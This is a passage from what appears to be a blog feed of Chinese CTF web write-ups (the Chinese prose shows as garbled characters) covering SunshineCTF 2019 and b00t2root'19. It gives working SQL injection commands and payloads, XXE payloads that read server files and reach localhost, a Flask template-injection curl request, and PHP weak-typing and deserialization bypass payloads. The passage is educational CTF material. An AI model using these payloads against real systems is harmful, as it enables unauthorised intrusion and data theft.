--dump</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç›´æ¥æ³¨nameä¸­çš„userè¡¨ï¼Œæ˜¯è·‘ä¸å‡ºä¿¡æ¯çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æŸ¥ä¸€ä¸‹sqlè¡¨ä¸­çš„ä¿¡æ¯ï¼Œçœ‹userè¡¨æ˜¯æ€æ ·æ„æˆçš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;sql&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2bd6a7ae08.png" alt="708F625A-1562-4597-B481-AA68C38283F2.png"></p><p> è¡¨ç»“æ„å‡ºæ¥äº†ä¹‹åç›´æ¥æŸ¥flagå°±å¥½äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sqli.txt --sql-query=&quot;SELECT group_concat(flag) FROM users&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2bd7e30458.png" alt="å±å¹•å¿«ç…§ 2019-04-02 ä¸Šåˆ9.17.45.png"></p><p>æ‰‹åŠ¨æ³¨å…¥å‚è€ƒï¼š <a href="https://ctftime.org/writeup/14208" target="_blank" rel="noopener">https://ctftime.org/writeup/14208</a></p><p>å…³é”®payloadè®°å½•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: ' union <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="keyword">group_concat</span>(<span class="keyword">name</span>), <span class="number">4</span>, <span class="keyword">group_concat</span>(<span class="keyword">sql</span>), <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span> <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> <span class="keyword">type</span> = <span class="string">"table"</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>è·å–è¡¨çš„ç»“æ„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</span><br><span class="line">    <span class="string">`username`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`password`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`avatar`</span>    <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`age`</span>   <span class="built_in">INTEGER</span>,</span><br><span class="line">    <span class="string">`name`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`title`</span> <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`flag`</span>  <span class="built_in">TEXT</span>,</span><br><span class="line">    <span class="string">`id`</span>    <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT</span><br><span class="line">),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_sequence(<span class="keyword">name</span>,seq)</span><br></pre></td></tr></table></figure><p>dump flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: ' union <span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(username), <span class="keyword">group_concat</span>(<span class="keyword">password</span>), <span class="keyword">group_concat</span>(avatar), <span class="keyword">group_concat</span>(age), <span class="keyword">group_concat</span>(<span class="keyword">name</span>), <span class="keyword">group_concat</span>(title), <span class="keyword">group_concat</span>(flag), <span class="keyword">group_concat</span>(<span class="keyword">id</span>) <span class="keyword">FROM</span> <span class="keyword">users</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>è¿”å›å€¼</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"desc"</span>&gt;</span>Flag: N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,example_flag,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,sun&#123;ju57_4n07h3r_5ql1_ch4ll&#125;,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Wrestler-Name-Generator"><a href="#0x02-Wrestler-Name-Generator" class="headerlink" title="0x02 Wrestler Name Generator"></a>0x02 Wrestler Name Generator</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1.é¢˜ç›®æè¿°"></a>1.é¢˜ç›®æè¿°</h3><p>Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.</p><p><a href="http://ng.sunshinectf.org" target="_blank" rel="noopener">http://ng.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-è§£é¢˜æ€è·¯-1"><a href="#2-è§£é¢˜æ€è·¯-1" class="headerlink" title="2.è§£é¢˜æ€è·¯"></a>2.è§£é¢˜æ€è·¯</h3><p>å…³é”®ç‚¹ï¼šå¯ä»¥çœ‹åˆ°æˆ‘è¾“å…¥çš„åç§°ä¹‹åè¿˜æ˜¯å®Œæˆçš„è¿›è¡Œäº†æ˜¾ç¤ºï¼ŒæœåŠ¡ç«¯è„šæœ¬æ˜¯PHPï¼Œå¹¶ä¸”è¯·æ±‚çš„Acceptå­—æ®µä¸­æœ‰xmlï¼Œæ‰€ä»¥çŒœæµ‹å¯èƒ½æ˜¯XXE</p><p>æ³¨æ„åœ¨ä½¿ç”¨paylaodæ˜¯è¦å…ˆbase64åurlç¼–ç  è¿›ä¸€æ­¥ä½¿ç”¨å¦‚ä¸‹ä¸åˆæ³•çš„XMLæ•°æ®è¿›è¡Œæµ‹è¯•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">version</span>=<span class="string">"abc"</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Doc</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°æŠ¥é”™</p><p><img src="https://i.loli.net/2019/04/02/5ca2bd993f247.png" alt="33F95B3F-40F7-44B5-94E3-F2F866E8FCC5.png"></p><p> ç¡®è®¤æ˜¯xxeæ¼æ´ï¼Œä¹‹åä½¿ç”¨å¦‚ä¸‹payloadå°è¯•å»è¯»å–<code>generate.php</code>çš„æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &apos;php://filter/convert.base64-encode/resource=generate.php&apos;&gt;]&gt;&lt;input&gt;&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯çš„æºä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$whitelist = array(</span><br><span class="line">    &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;::1&apos;</span><br><span class="line">);</span><br><span class="line">// if this page is accessed from the web server, the flag is returned</span><br><span class="line">// flag is in env variable to avoid people using XXE to read the flag</span><br><span class="line">// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)</span><br><span class="line">if(in_array($_SERVER[&apos;REMOTE_ADDR&apos;], $whitelist))&#123;</span><br><span class="line">echo $_ENV[&quot;FLAG&quot;];</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">// make sure the input parameter exists</span><br><span class="line">if (empty($_GET[&quot;input&quot;])) &#123;</span><br><span class="line">echo &quot;Please include the &apos;input&apos; get parameter with your request, Brother&quot;;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// get input</span><br><span class="line">$xmlData = base64_decode($_GET[&quot;input&quot;]);</span><br><span class="line">// parse xml</span><br><span class="line">$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die(&quot;Error parsing XML: &quot;.&quot;\n&quot;.$xmlData);</span><br><span class="line">$firstName = $xml-&gt;firstName;</span><br><span class="line">$lastName = $xml-&gt;lastName;</span><br><span class="line">// generate name</span><br><span class="line">$nouns = array(&quot;Killer&quot;, &quot;Savage&quot;, &quot;Stallion&quot;, &quot;Coder&quot;, &quot;Hacker&quot;, &quot;Slasher&quot;, &quot;Crusher&quot;, &quot;Barbarian&quot;, &quot;Ferocious&quot;, &quot;Fierce&quot;, &quot;Vicious&quot;, &quot;Hunter&quot;, &quot;Brute&quot;, &quot;Tactician&quot;, &quot;Expert&quot;);</span><br><span class="line">$noun = $nouns[array_rand($nouns)];</span><br><span class="line">$generatedName = $firstName.&apos; &quot;The &apos;.$noun.&apos;&quot; &apos;.$lastName;</span><br><span class="line"></span><br><span class="line">// return html for the results page</span><br><span class="line">echo &lt;&lt;&lt;EOT</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Wrestler Name Generator&lt;/title&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;jumbotron text-center&quot;&gt;</span><br><span class="line">  &lt;h1&gt;Your Wrestler Name Is:&lt;/h1&gt;</span><br><span class="line">  &lt;h2&gt;$generatedName&lt;/h2&gt; </span><br><span class="line">&lt;!--hacker name functionality coming soon!--&gt;</span><br><span class="line">&lt;!--if you&apos;re trying to test the hacker name functionality, make sure you&apos;re accessing this page from the web server--&gt;</span><br><span class="line">&lt;!--&lt;h2&gt;Your Hacker Name Is: REDACTED&lt;/h2&gt;--&gt;</span><br><span class="line">  &lt;a href=&quot;/&quot;&gt;Go Back&lt;/a&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOT;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»æºç ä¸Šæ¥çœ‹åªè¦ä»æœ¬åœ°è®¿é—®<code>generate.php</code>æ–‡ä»¶å°±å¯ä»¥è·å–flagï¼Œæ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span><span class="meta">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM 'http://localhost/generate.php'&gt;]&gt;</span><span class="tag">&lt;<span class="name">input</span>&gt;</span><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿”å›çš„ç»“æœ <code>sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</code></p><h2 id="0x03-Portfolio"><a href="#0x03-Portfolio" class="headerlink" title="0x03 Portfolio"></a>0x03 Portfolio</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1.é¢˜ç›®æè¿°"></a>1.é¢˜ç›®æè¿°</h3><p>Check out my development portfolio! Iâ€™m just getting started, so donâ€™t be too mean :(</p><p><a href="http://folio.sunshinectf.org" target="_blank" rel="noopener">http://folio.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-è§£é¢˜æ€è·¯-2"><a href="#2-è§£é¢˜æ€è·¯-2" class="headerlink" title="2.è§£é¢˜æ€è·¯"></a>2.è§£é¢˜æ€è·¯</h3><p>é¦–å…ˆwebæ¡†æ¶æ˜¯flaskï¼›å…¶æ¬¡å¯ä»¥çœ‹åˆ°URLåé¢çš„å‚æ•°æ˜¯nameï¼Œè€Œé¡µé¢å¯¹åº”çš„ä¹Ÿæ˜¯nameï¼›å¦‚æœä¿®æ”¹ä¸ºzeroyuï¼Œåˆ™é¡µé¢å¯¹åº”ä¹Ÿæ˜¾ç¤ºzeroyu</p><p><img src="https://i.loli.net/2019/04/02/5ca2bdbf309c4.png" alt="7DBD4583-BD88-4783-86A8-613E8BF18018.png"></p><p> ä½†æ˜¯å¦‚æœæˆ‘è¾“å…¥<code>9</code>çš„è¯å¹¶ä¸ä¼šäº§ç”Ÿå¯¹åº”çš„è®¡ç®—</p><p><img src="https://i.loli.net/2019/04/02/5ca2bdd1e09fc.png" alt="7001968E-4A77-4187-9DFB-A4985F9085C2.png"></p><p> ä¹‹åè®¿é—®å¦å¤–ä¸€ä¸ªç•Œé¢ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°ä¸€è¡Œæäº¤ä¿¡æ¯è¢«æ³¨é‡Šæ‰äº†ï¼Œç¼–è¾‘htmlå°†æ³¨é‡Šå»é™¤å¹¶è¿›è¡Œæäº¤ã€‚ <img src="https://i.loli.net/2019/04/02/5ca2bde9f0ac0.png" alt="8156B4B1-2EE4-4BA2-BDF1-D0179ED07027.png"></p><p>ä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆæ•ˆæœï¼Œæ‰€ä»¥ä¸å¦¨ç›´æ¥è®¿é—®ä¸€ä¸‹å¯¹åº”çš„è·¯å¾„ï¼Œè€Œä¸ä½¿ç”¨è¿™ä¸ªæ¨¡æ¿å‚æ•°ã€‚ <code>http://folio.sunshinectf.org/templates/admin.html</code> å¾—åˆ°ä¸€äº›è¿”å›ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if config.DEBUG %&#125; &#123;&#123;config.FLAG&#125;&#125; &#123;% endif %&#125; Hi there!</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥çœ‹åˆ°flagæ˜¯åœ¨configä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ å¦‚ä¸‹payloadå¹¶åˆ©ç”¨<code>http://folio.sunshinectf.org/render</code>è¿™ä¸ªç‚¹ï¼Œæœ€ç»ˆæˆåŠŸget flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://folio.sunshinectf.org/render --data &quot;template=hello/&#123;&#123;config.items()&#125;&#125;&quot; -L</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2be01903ae.png" alt="C67FB07F-C140-451D-B24D-EFF0AE88E180.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;æ¯”èµ›åœ°å€: &lt;a href=&quot;https://2019.sunshinectf.org/challe
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>b00t2root&#39;19 web writeup</title>
    <link href="http://zer0yu.github.io/2019/04/01/b00t2root-19-web/"/>
    <id>http://zer0yu.github.io/2019/04/01/b00t2root-19-web/</id>
    <published>2019-04-01T08:10:04.000Z</published>
    <updated>2019-04-01T08:13:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ¯”èµ›åœ°å€: <a href="http://3.17.26.191/" target="_blank" rel="noopener">http://3.17.26.191/</a></p><p>æ—¶é—´: æ˜ŸæœŸäº”, ä¸‰æœˆ 29, 11:30 PM (23:00) â€” æ˜ŸæœŸå…­, ä¸‰æœˆ 30, 11:30 PM (23:00)</p><h2 id="0x01-EasyPhp"><a href="#0x01-EasyPhp" class="headerlink" title="0x01 EasyPhp"></a>0x01 EasyPhp</h2><p>æ­¤é¢˜å…±åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥ï¼š</p><ol><li>å…³äºPHP 0e[0-9]+æ ¼å¼md5çš„å¼±ç±»å‹æ ¡éªŒ</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$str1 = $_GET[<span class="string">'1'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123; </span><br><span class="line">        <span class="keyword">echo</span> $flag1; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>å…³äºPHP hashå‡½æ•°çš„å¼±ç±»å‹æ ¡éªŒ=&gt;æ•°ç»„å½¢å¼2[]=1&amp;3[]=2ä½¿å…¶è¿”å›nullè¿›è€Œå¼±ç±»å‹ç›¸ç­‰</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$str2 = $_GET[<span class="string">'2'</span>]; </span><br><span class="line">$str3 = $_GET[<span class="string">'3'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123; </span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123; </span><br><span class="line">            <span class="keyword">echo</span> $flag2; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>PHPçš„åºåˆ—åŒ–ä¸ååºåˆ—çš„å¼•ç”¨ç±»å‹<br>é¢˜ç›®çš„æºä»£ç </li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $temp; </span><br><span class="line">    <span class="keyword">var</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123; </span><br><span class="line">    $str4 = $_GET[<span class="string">'4'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; </span><br><span class="line">        $str4=stripslashes($str4); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    $res = unserialize($str4); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($res) &#123; </span><br><span class="line">    $res-&gt;flag=$flag3; </span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp) </span><br><span class="line">            <span class="keyword">echo</span> $res-&gt;flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹å¦‚ä¸‹ä¸¤ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str4 = <span class="string">'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:3;&#125;'</span>;</span><br><span class="line">$res = unserialize($str4);</span><br><span class="line">print_r($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__PHP_Incomplete_Class Object</span><br><span class="line">(</span><br><span class="line">    [__PHP_Incomplete_Class_Name] =&gt; Secrets</span><br><span class="line">    [temp] =&gt;</span><br><span class="line">    [test] =&gt; 100</span><br><span class="line">    [flag] =&gt; 100</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str4 = <span class="string">'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:2;&#125;'</span>;</span><br><span class="line">$res = unserialize($str4);</span><br><span class="line">print_r($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__PHP_Incomplete_Class Object</span><br><span class="line">(</span><br><span class="line">    [__PHP_Incomplete_Class_Name] =&gt; Secrets</span><br><span class="line">    [temp] =&gt;</span><br><span class="line">    [test] =&gt; 100</span><br><span class="line">    [flag] =&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ååºåˆ—åŒ–ä¸­çš„å¼•ç”¨ç±»å‹æ¥ç»•è¿‡æ­¤å¤„çš„æ ¡éªŒ<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Secrets&quot;:2:&#123;s:4:&quot;temp&quot;;N;s:4:&quot;flag&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Set-Me-Free"><a href="#0x02-Set-Me-Free" class="headerlink" title="0x02 Set Me Free"></a>0x02 Set Me Free</h2><p>ä½¿ç”¨Python3.7ç¼–å†™çš„å…·æœ‰äºŒåˆ†æŸ¥æ‰¾åŠŸèƒ½çš„sqlç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 